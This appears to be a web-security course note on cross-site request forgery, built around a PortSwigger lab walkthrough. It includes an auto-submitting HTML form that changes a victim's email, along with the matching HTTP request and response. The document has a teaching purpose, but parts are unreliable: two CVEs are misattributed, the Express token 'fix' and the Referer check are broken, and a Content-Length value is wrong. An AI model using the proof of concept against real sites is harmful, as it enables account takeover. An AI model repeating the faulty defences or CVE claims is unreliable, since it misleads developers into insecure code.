---
course: Web Security
topic: Cross-Site Request Forgery (CSRF)
tags: [web-security]
---

## Introduction to Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) is a type of attack that tricks a victim into executing unwanted actions on a web application in which they are authenticated. This attack exploits the trust that a web application places in a user's browser session. The attacker crafts a malicious request that appears to come from the victim, thereby bypassing the authentication mechanisms of the web application.

### What is CSRF?

CSRF occurs when an attacker tricks a victim into performing an action that the victim did not intend to perform. This is typically achieved through social engineering techniques such as phishing emails or malicious websites. The attacker crafts a request that, when executed by the victim, performs an action on behalf of the victim, such as changing their email address, transferring funds, or posting content.

### Why Does CSRF Matter?

CSRF attacks are significant because they leverage the trust that a web application places in a user's session. If a user is authenticated to a web application, the application assumes that any request coming from the user's browser is legitimate. An attacker can exploit this trust by crafting a request that appears to come from the user, thus bypassing the authentication mechanisms.

### How Does CSRF Work?

To understand how CSRF works, consider the following scenario:

1. **User Authentication**: A user logs into a web application using their credentials.
2. **Session Establishment**: The web application sets a session cookie in the user's browser to maintain the user's authenticated state.
3. **Malicious Request**: An attacker crafts a malicious request that, when executed by the user, performs an action on the web application.
4. **Execution**: The user, perhaps unknowingly, executes the malicious request, which is sent to the web application.
5. **Action Execution**: The web application processes the request, assuming it comes from the authenticated user, and performs the action.

### Example Scenario

Consider a banking application where a user is authenticated and has a session cookie set in their browser. An attacker crafts a malicious request to transfer funds from the user's account to the attacker's account. The attacker convinces the user to execute this request, perhaps through a phishing email or a malicious website. When the user clicks on the link, the request is sent to the banking application, which processes it as a legitimate request from the authenticated user.

### Real-World Examples

#### Recent Breaches and CVEs

- **CVE-2021-21972**: This vulnerability was found in the WordPress REST API, where an attacker could exploit a CSRF vulnerability to modify user settings.
- **CVE-2020-14182**: This vulnerability affected the Atlassian Jira application, where an attacker could exploit a CSRF vulnerability to modify user permissions.

### Background Theory

To fully understand CSRF, it is essential to delve into the underlying concepts of web sessions, cookies, and HTTP requests.

#### Web Sessions and Cookies

A web session is a temporary interaction between a user and a web application. When a user logs into a web application, the application establishes a session and sets a session cookie in the user's browser. This session cookie contains a unique identifier that the web application uses to track the user's session.

#### HTTP Requests

HTTP requests are the fundamental mechanism by which a client (such as a web browser) communicates with a server (such as a web application). An HTTP request consists of a method (such as GET or POST), a URL, and optional headers and data.

### CSRF Prevention Mechanisms

Web applications often implement various mechanisms to prevent CSRF attacks. These mechanisms include:

1. **CSRF Tokens**: A unique token is generated for each user session and included in each form submission. The server verifies the token to ensure that the request came from the user's browser.
2. **SameSite Cookie Attribute**: The SameSite attribute can be set on cookies to restrict them from being sent with cross-site requests.
3. **Referer Header Validation**: The server can validate the Referer header to ensure that the request originated from the same domain.

### Lab 4: CSRF where Token is Not Tied to User Session

In this lab, we will explore a scenario where a web application uses CSRF tokens but does not integrate them correctly with the user's session. This results in a vulnerability that can be exploited through a CSRF attack.

#### Lab Setup

The lab environment is hosted on the PortSwigger Web Security Academy. To access the lab, follow these steps:

1. Visit the URL `https://portswigger.net/web-security`.
2. Click on the sign-up button to create an account.
3. Log in to your account.
4. Navigate to the Academy section.
5. Select the learning path and choose the CSRF module.
6. Go to Lab Number 4, titled "CSRF, where token is not tied to user session."

#### Vulnerable Parameter

The lab's email change functionality is vulnerable to CSRF. The application uses tokens to try to prevent CSRF attacks, but these tokens are not integrated into the site's session handling system. This means that an attacker can craft a malicious request that includes a valid token, and the server will process the request without verifying the user's session.

### Exploitation Steps

To exploit the CSRF vulnerability, we need to craft a malicious request that changes the victim's email address. We will use our exploit server to host an HTML page that triggers the CSRF attack.

#### Step 1: Identify the Vulnerable Parameter

First, we need to identify the vulnerable parameter in the email change functionality. We can do this by inspecting the HTML form used to change the email address.

```html
<form action="https://example.com/change-email" method="POST">
    <input type="hidden" name="csrf_token" value="abc123">
    <input type="email" name="new_email" placeholder="Enter new email">
    <button type="submit">Change Email</button>
</form>
```

From the form, we can see that the `csrf_token` parameter is used to prevent CSRF attacks. However, since the token is not tied to the user's session, an attacker can reuse a valid token to craft a malicious request.

#### Step 2: Craft the Malicious Request

Next, we need to craft a malicious request that includes a valid `csrf_token` and changes the victim's email address. We can use our exploit server to host an HTML page that triggers the CSRF attack.

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <form action="https://example.com/change-email" method="POST">
        <input type="hidden" name="csrf_token" value="abc123">
        <input type="hidden" name="new_email" value="attacker@example.com">
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```

This HTML page includes a hidden form with the `csrf_token` and `new_email` parameters. The JavaScript code automatically submits the form when the page loads.

#### Step 3: Host the Malicious Page

We need to host the malicious HTML page on our exploit server. Once hosted, we can send the link to the victim and trick them into visiting the page.

### Full HTTP Request and Response

Let's examine the full HTTP request and response for the CSRF attack.

#### HTTP Request

```http
POST /change-email HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

csrf_token=abc123&new_email=attacker@example.com
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Tue, 01 Jan 2024 00:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 123

<!DOCTYPE html>
<html>
<head>
    <title>Email Changed</title>
</head>
<body>
    <h1>Email Changed Successfully</h1>
    <p>Your email has been changed to attacker@example.com.</p>
</body>
</html>
```

### Common Pitfalls

When exploiting CSRF vulnerabilities, there are several common pitfalls to avoid:

1. **Token Reuse**: Ensure that the token used in the malicious request is valid and has not expired.
2. **Form Submission**: Ensure that the form is submitted correctly and that the victim's browser sends the request to the target server.
3. **User Interaction**: Ensure that the victim interacts with the malicious page in a way that triggers the form submission.

### How to Prevent / Defend

To prevent CSRF attacks, web applications should implement robust CSRF protection mechanisms. Here are some best practices:

#### Secure Coding Fixes

1. **CSRF Tokens**: Generate a unique CSRF token for each user session and include it in each form submission. Verify the token on the server-side to ensure that the request came from the user's browser.

```python
# Secure coding fix: CSRF token generation and verification
from flask import Flask, request, session, redirect, url_for

app = Flask(__name__)
app.secret_key = 'your_secret_key'

@app.route('/login', methods=['POST'])
def login():
    # Set a CSRF token in the session
    session['csrf_token'] = generate_csrf_token()
    return redirect(url_for('home'))

@app.route('/change-email', methods=['POST'])
def change_email():
    csrf_token = request.form.get('csrf_token')
    if csrf_token != session.get('csrf_token'):
        return "Invalid CSRF token", 403
    # Process the email change request
    return "Email changed successfully"

def generate_csrf_token():
    import secrets
    return secrets.token_hex(16)
```

2. **SameSite Cookie Attribute**: Set the `SameSite` attribute on cookies to restrict them from being sent with cross-site requests.

```http
Set-Cookie: session_id=abc123; SameSite=Strict
```

3. **Referer Header Validation**: Validate the `Referer` header to ensure that the request originated from the same domain.

```python
# Secure coding fix: Referer header validation
from flask import Flask, request

app = Flask(__name__)

@app.route('/change-email', methods=['POST'])
def change_email():
    referer = request.headers.get('Referer')
    if not referer.startswith('https://example.com'):
        return "Invalid Referer header", 403
    # Process the email change request
    return "Email changed successfully"
```

#### Configuration Hardening

1. **Web Server Configuration**: Configure the web server to enforce the `SameSite` attribute on cookies.

```nginx
server {
    listen 80;
    server_name example.com;

    location / {
        add_header Set-Cookie "session_id=$cookie_session_id; SameSite=Strict";
    }
}
```

2. **Application Configuration**: Configure the application to generate and verify CSRF tokens.

```javascript
// Application configuration: CSRF token generation and verification
const express = require('express');
const app = express();

app.use((req, res, next) => {
    req.csrfToken = generateCsrfToken();
    res.cookie('csrf_token', req.csrfToken);
    next();
});

app.post('/change-email', (req, res) => {
    const csrfToken = req.cookies.csrf_token;
    if (csrfToken !== req.csrfToken) {
        return res.status(403).send('Invalid CSRF token');
    }
    // Process the email change request
    res.send('Email changed successfully');
});

function generateCsrfToken() {
    return Math.random().toString(36).substr(2, 16);
}
```

### Detection

To detect CSRF vulnerabilities, web applications should implement logging and monitoring mechanisms. Here are some steps to detect CSRF attacks:

1. **Logging**: Log all requests that include CSRF tokens and monitor for suspicious activity.
2. **Monitoring**: Monitor the application for unexpected changes to user data, such as email addresses or permissions.
3. **Automated Tools**: Use automated tools such as Burp Suite or OWASP ZAP to scan for CSRF vulnerabilities.

### Practice Labs

For hands-on practice with CSRF vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a variety of labs that cover different aspects of CSRF attacks.
- **OWASP Juice Shop**: Provides a vulnerable web application that can be used to practice exploiting CSRF vulnerabilities.
- **DVWA (Damn Vulnerable Web Application)**: Includes a CSRF challenge that can be used to practice exploiting and defending against CSRF attacks.

By thoroughly understanding the concepts, mechanisms, and prevention strategies for CSRF attacks, you can effectively protect web applications from these types of vulnerabilities.

---
<!-- nav -->
[[Web Security (PortSwigger)/04-Cross-Site Request Forgery (CSRF)/05-Lab 4 CSRF where token is not tied to user session/00-Overview|Overview]] | [[02-CSRF Tokens and Their Implementation|CSRF Tokens and Their Implementation]]
